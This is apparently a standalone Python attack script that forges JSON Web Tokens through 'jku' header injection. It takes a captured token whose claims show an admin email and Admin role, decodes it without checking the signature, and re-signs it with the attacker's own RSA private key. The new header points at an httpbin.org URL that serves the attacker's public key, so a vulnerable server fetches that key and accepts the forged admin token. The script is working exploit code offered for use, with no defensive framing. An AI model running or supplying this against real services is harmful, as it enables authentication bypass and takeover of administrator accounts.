import jwt
import base64
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Take a JWT and JKU URL as input
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzOTViNmI5NS05NGIxLTRhZjItYWRmNS04MzNkODkwYTNjYzgiLCJlbWFpbCI6ImFkbWluQFZlbmRvci5jb20iLCJnaXZlbl9uYW1lIjoiYWRtaW4iLCJqdGkiOiJlMWJhMzI2Yy02YjE4LTQ5MGItOTY5ZC04ZjkyMGNjNjY2MzkiLCJyb2xlcyI6WyJBZG1pbiJdLCJJc0FwcHJvdmVkIjoiVHJ1ZSIsImV4cCI6MTc0NTA2NjE2MiwiaXNzIjoiU2VydmljZVByb3ZpZGVyQXBwIiwiYXVkIjoiU2VydmljZVByb3ZpZGVyQXBwIHVzZXJzIn0.eKS1t6frhFiO9uJ-zA0RGPnC48PeDyDYEb_6sIknGkE'
jku_url = 'https://httpbin.org/base64/ew0KICAia3R5IjogIlJTQSIsDQogICJraWQiOiAiand0X3Rvb2wiLA0KICAidXNlIjogInNpZyIsDQogICJhbGciOiAiUlMyNTYiLA0KICAibiI6ICI4TkJvRGJPXy1DdVRvZnlJdHNWZ3kwMzVRMjNtU3MzbTRDWmw2dzJLWjEybnpISlliNjNWQUFoc0l3bGozZ3RjeGxMaEdyZ1NLbi1KSDRGN3BjelFCeTJLZzg0aHowb2dXNkUxcGdoMFp1eW1oQ1FPZ055UFR4N0pmaUZaTkpnY3R3dnQ2M1FOVWRpTHdQem9CUm5SWkdHNkRjUU5UTWd4aUQ1djI3RmlBWDVsR1pERWZ1MDloaHBKYTZRdU5rZ3FRRUtoRkN5UjEwQk9mYkduZ0FmUkRtZkxRdHozN09pREJFZGFSU1kwa1p1cUJ5ZmZkN3pQazlaLXp1V2dWdklESnJuQnNMaC1EblBTeDY3VjR3SWpXcVUxa1BWVWplR25jWFZ3S2tSck9tYmd5dzJ0Ym9aaGU1WHFITVhtNFNUTEhveEtXR2F2aWZjR2dtd19ONzF4cXciLA0KICAiZSI6ICJBUUFCIg0KfQ=='

# Load and serialize the public key
with open('jwttool_custom_public_RSA.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

# Decode the JWT (updated for PyJWT 2.x)
decoded_token = jwt.decode(
    token, 
    key=None,
    algorithms=["HS256", "RS256"],  # Support both algorithms
    options={"verify_signature": False}
)
print(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}\n")
decoded_header = jwt.get_unverified_header(token)
print(f"Decoded header:\n{json.dumps(decoded_header, indent=4)}\n")

# Sign the modified JWT using your RSA private key
with open('jwttool_custom_private_RSA.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

# Extract the necessary information from the keys
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

# Build the JWKs
jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
    "kid": decoded_header.get('kid', 'jwt_tool'),  # Use existing kid or default if not present
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
}
keys = {"keys": [jwk]}
print(f"JWK:\n{json.dumps(keys, indent=4)}\n")

# Generate the modified token
modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jku': jku_url, 'kid': jwk['kid']})

# Print the modified token header
modified_header = jwt.get_unverified_header(modified_token)
print(f"Modified header:\n{json.dumps(modified_header, indent=4)}\n")

# Print the final token
print("Final Token: " + modified_token)